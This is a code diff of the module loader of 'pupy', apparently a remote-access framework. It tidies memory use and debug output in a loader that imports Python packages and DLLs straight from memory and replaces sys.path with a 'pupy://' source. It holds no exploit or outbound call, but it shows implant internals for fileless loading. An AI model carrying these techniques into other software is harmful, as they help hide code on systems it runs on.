@@ -260,7 +260,9 @@ def get_module_files(fullname):
 
     if len(files) > 1:
         # If we have more than one file, than throw away dlls
-        files = [ x for x in files if not x.endswith('.dll') ]
+        retfiles = [ x for x in files if not x.endswith('.dll') ]
+        del files[:]
+        return retfiles
 
     return files
 
@@ -273,10 +275,14 @@ def pupy_add_package(pkdic, compressed=False, name=None):
         pkdic = zlib.decompress(pkdic)
 
     module = cPickle.loads(pkdic)
+    del pkdic
 
-    dprint('Adding files: {}'.format(module.keys()))
+    if __debug__:
+        dprint('Adding files: {}'.format(module.keys()))
 
     modules.update(module)
+
+    del module
 
     if name:
         try:
@@ -286,7 +292,8 @@ def pupy_add_package(pkdic, compressed=False, name=None):
 
     gc.collect()
 
-    memtrace(name)
+    if __debug__:
+        memtrace(name)
 
 def has_module(name):
     if name in sys.modules or name in modules:
@@ -334,8 +341,6 @@ def load_dll(name, buf):
 def invalidate_module(name):
     import pupy
 
-    global __debug
-
     for item in modules.keys():
         if item == name or item.startswith(name+'.'):
             dprint('Remove {} from pupyimporter.modules'.format(item))
@@ -354,12 +359,14 @@ def invalidate_module(name):
             dprint('Remove {} from rpyc namespace'.format(item))
             pupy.namespace.__invalidate__(item)
 
-        if __debug:
-            for obj in gc.get_objects():
-                if id(obj) == mid:
-                    dprint('Module {} still referenced by {}'.format(
-                        item, [ id(x) for x in gc.get_referrers(obj) ]
-                    ))
+        if __debug__:
+            global __debug
+            if __debug:
+                for obj in gc.get_objects():
+                    if id(obj) == mid:
+                        dprint('Module {} still referenced by {}'.format(
+                            item, [ id(x) for x in gc.get_referrers(obj) ]
+                        ))
 
     gc.collect()
 
@@ -574,6 +581,8 @@ class PupyPackageFinder(object):
                 dprint('{} not selected from {}'.format(fullname, files))
                 return None
 
+            del files[:]
+
             content = modules[selected]
             dprint('{} found in "{}" / size = {}'.format(fullname, selected, len(content)))
 
@@ -668,9 +677,9 @@ def install(debug=None, trace=False):
     else:
         dprint('Install pupyimporter - standalone')
 
-        sys.meta_path = []
-        sys.path = []
-        sys.path_hooks = []
+        del sys.meta_path[:]
+        del sys.path[:]
+        del sys.path_hooks[:]
         sys.path_hooks = [PupyPackageFinder]
         sys.path.append('pupy://')
         sys.path_importer_cache.clear()
@@ -681,17 +690,18 @@ def install(debug=None, trace=False):
             '32bit' if pupy.get_arch() == 'x86' else '64bit', ''
         )
 
-    try:
-        if __trace:
-            __trace = __import__('tracemalloc')
+    if __debug__:
+        try:
+            if __trace:
+                __trace = __import__('tracemalloc')
 
-        if __debug and __trace:
-            dprint('tracemalloc enabled')
-            __trace.start(10)
+            if __debug and __trace:
+                dprint('tracemalloc enabled')
+                __trace.start(10)
 
-    except Exception, e:
-        dprint('tracemalloc init failed: {}'.format(e))
-        __trace = None
+        except Exception, e:
+            dprint('tracemalloc init failed: {}'.format(e))
+            __trace = None
 
     import ctypes
     import ctypes.util
@@ -734,12 +744,16 @@ def install(debug=None, trace=False):
         if name in modules:
             if hasattr(_memimporter, 'load_library'):
                 try:
-                    return _memimporter.load_library(modules[name], name)
+                    library = _memimporter.load_library(modules[name], name)
+                    del modules[name]
+                    return library
                 except:
                     pass
             elif hasattr(pupy, 'load_dll'):
                 try:
-                    return pupy.load_dll(name, modules[name])
+                    library = pupy.load_dll(name, modules[name])
+                    del modules[name]
+                    return library
                 except:
                     pass
 
